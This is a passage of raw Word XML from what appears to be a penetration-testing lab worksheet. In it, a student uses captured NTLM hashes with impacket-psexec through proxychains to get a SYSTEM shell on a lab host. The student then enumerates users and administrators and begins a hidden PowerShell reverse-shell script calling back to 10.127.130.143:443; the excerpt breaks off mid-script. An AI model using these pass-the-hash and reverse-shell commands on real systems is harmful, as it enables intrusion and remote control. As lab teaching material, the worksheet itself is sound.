          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">u deanna </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">2157c166d12a07349c69b5e909a12a30 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x "whoami"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="10760"/>
        </w:tabs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g.   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-23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id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his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empt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uc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eed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or f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?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it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cc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,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w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o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y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ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="5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k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w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?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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="21"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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e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mp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cket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'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ps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xec.py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 get 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ull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hell (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ne li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)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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="261" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="1101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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sudo proxychains impacket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:hyperlink r:id="rId33">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
            <w:color w:val="CC6600"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t xml:space="preserve">psexec deanna@172.31.1.14 </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
            <w:color w:val="CC6600"/>
            <w:spacing w:val="-1"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
            <w:color w:val="CC6600"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>hashes b4c7d8d275ce641fb26db68ac9f3608a:2157c166d12a07349c69b5e909a12a30</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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i.   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="34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Con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m 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y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u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v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e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n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nte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ct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iv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e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hell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-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PC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. You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ee:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2124" w:right="7624"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Wi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>st</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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2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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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T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 xml:space="preserve">t </w:t>
      </w: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t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 xml:space="preserve">he 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 xml:space="preserve">hell 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>w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ith a few</w:t>
      </w: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 xml:space="preserve"> c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o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>mm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and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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="413" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="8626"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>hostname whoami net user</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="39"/>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>net localgroup administrators</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="10720"/>
        </w:tabs>
        <w:spacing w:before="44" w:line="400" w:lineRule="atLeast"/>
        <w:ind w:left="2520" w:right="1457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What privilege l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vel is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y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our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hell at?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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00600AB3">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>Nt-authority\system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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:w w:val="33"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single" w:color="404040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 Is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Dean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a in the admin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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i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tra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ors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group?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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00600AB3">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>yes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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="14" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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3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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Create </w:t>
      </w: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t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he Po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>w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 xml:space="preserve">erShell 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>R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ever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e Shell S</w:t>
      </w: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ri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>p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t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRPr="0020708D" w:rsidRDefault="00A76861" w:rsidP="0020708D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:right="1076"/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</w:pPr>
      <w:r w:rsidRPr="0020708D"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Copy</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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t</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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he </w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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c</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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n</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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en</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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t</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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o</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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f</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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he</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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a</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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ct</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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iv</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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y file</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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v</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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erse.</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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b</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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.</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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xt</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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t</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 yo</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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u</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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r</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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clip</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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bo</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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,</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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d</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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h</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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en</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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pa</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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s</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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 it</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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in</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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t</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 a</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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K</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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li mo</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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u</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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sep</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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a</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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d</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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 w:rsidRPr="0020708D"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ext</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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 xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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f</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D"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ile.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0020708D" w:rsidRDefault="0020708D" w:rsidP="0020708D">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="1076"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0020708D" w:rsidRPr="0020708D" w:rsidRDefault="0020708D" w:rsidP="0020708D">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="1076"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0020708D">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>@echo off</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0020708D" w:rsidRPr="0020708D" w:rsidRDefault="0020708D" w:rsidP="0020708D">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="1076"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0020708D">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>powershell -nop -w hidden -Command "$nl=[System.Environment]::NewLine;$client=New-Object</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0020708D" w:rsidRPr="0020708D" w:rsidRDefault="0020708D" w:rsidP="0020708D">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="1076"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0020708D">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>System.Net.Sockets.TCPClient(</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>'10.127.130.143</w:t>
      </w:r>
      <w:r w:rsidRPr="0020708D">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>',443);$stream=$client.GetStream();$bytes=New-Object byte[] 1024;$send=New-</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0020708D" w:rsidRPr="0020708D" w:rsidRDefault="0020708D" w:rsidP="0020708D">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="1076"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0020708D">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Object System.Text.ASCIIEncoding;Write-Host($stream.Read($bytes,0,$bytes.Length) -ne 0){$data =</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0020708D" w:rsidRPr="0020708D" w:rsidRDefault="0020708D" w:rsidP="0020708D">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1440" w:right="1076"/>
        <w:rPr>
